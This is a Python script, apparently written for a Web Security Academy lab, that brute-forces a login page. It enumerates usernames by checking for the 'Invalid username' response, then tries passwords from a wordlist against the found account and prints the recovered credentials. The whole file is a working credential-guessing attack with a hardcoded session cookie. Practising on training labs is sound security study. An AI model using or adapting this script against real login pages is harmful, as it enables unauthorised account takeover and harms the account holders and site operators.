import requests


target = "https://ace41f551eb04c24c0c2242f00f60013.web-security-academy.net/login"
session_cookie = {'session': 'Qx9TNKc1OPKzuUJBufWfZxOiqz9Iwg73'}

user_list = open('/opt/wordlists/usernames.txt', 'r')
users = [l.strip('\n') for l in user_list]
pass_list = open('/opt/wordlists/passwords.txt', 'r')
passwords = [i.strip('\n') for i in pass_list]





def bruteforce():
    found_user = ''
    found_pass = ''
    for user in users:
        print(f'ENUMERATING {user}')
        data = {'username': user, 'password': 'swag'}
        response = requests.post(target, data=data, cookies=session_cookie)
       #print(response.text)
        if 'Invalid username' not in response.text:
            print(f'[USER FOUND] {user}')
            found_user = user
            break
    for p in passwords:
        print(f'TESTING {p}')
        data = {'username': found_user, 'password': p}
        response = requests.post(target, data=data, cookies=session_cookie)
        if 'Incorrect password' not in response.text:
            print(f'FOUND PASSWORD: {p}')
            found_pass = p
            break
    print(f'USERNAME: {found_user}, PASSWORD: {found_pass}')



bruteforce()

